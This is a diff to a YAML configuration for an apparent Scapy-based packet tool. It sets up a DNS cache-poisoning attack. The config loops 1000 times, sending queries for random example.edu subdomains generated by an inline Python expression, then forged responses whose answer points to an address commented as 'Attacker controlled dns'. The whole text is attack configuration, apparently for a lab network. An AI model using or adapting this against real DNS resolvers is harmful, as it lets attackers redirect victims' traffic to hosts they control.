@@ -1,5 +1,6 @@
 loop:
     count: 1000
+    variable: "python:str(__import__('random').randint(0, 0xff000)) + '.example.edu'" # Set this to be the variable...
     method:
         send:
             packets: # Scapy calls this 'x'
@@ -12,7 +13,7 @@ loop:
                             id: 0 # This is ransomized in a real query
                             qdcount: 1
                             qd:
-                                qname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSQR
+                                qname: "GZILLA_VAR" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSQR
                                 qtype: "A" # A
                                 qclass: "IN" # IN
             iface: "eth0"
@@ -35,11 +36,11 @@ loop:
                                     nscount: 1
                                     arcount: 1
                                     qd:
-                                        qname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSQR
+                                        qname: "GZILLA_VAR" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSQR
                                         qtype: "A" # A
                                         qclass: "IN" # IN
                                     an:
-                                        rrname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
+                                        rrname: "GZILLA_VAR" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
                                         type: "A"
                                         rclass: "IN"
                                         rdata: "172.22.0.5" # Attacker controlled dns
